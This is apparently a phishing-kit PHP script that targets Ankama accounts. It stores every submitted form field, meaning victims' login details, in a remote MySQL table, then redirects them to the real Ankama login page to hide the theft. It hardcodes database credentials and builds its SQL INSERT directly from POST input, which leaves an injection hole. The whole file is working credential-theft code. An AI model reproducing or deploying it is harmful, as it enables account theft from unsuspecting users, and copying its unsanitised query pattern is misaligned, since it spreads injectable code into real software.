<?php 

    $servername = "sql312.iceiy.com";
    $username = "icei_41144623";
    $password = "ycSbXswqFfdu";
    $dbname = "icei_41144623_ankama";

    $conn = new mysqli($servername, $username, $password, $dbname);

    foreach($_POST as $key => $value){
        $sql = "INSERT INTO tbl_user_data (field, data) VALUES ('$key', '$value')";
        $conn->query($sql);
    }

    header("Location: https://auth.ankama.com/login/ankama/form?origin_tracker=https://www.ankama.com/en&redirect_uri=https://auth.ankama.com/login-authorized?state%3DeyJzdGF0ZV9pZCI6ImttcUFsQ204M0xpSU5mRUoxUmkwUDlsdm53akhYdDBKTnR4ZVJOYnluNFEiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FjY291bnQuYW5rYW1hLmNvbS9hdXRob3JpemVkIiwicHJvdmlkZXIiOiJBbmthbWEifQ");
    die();

?>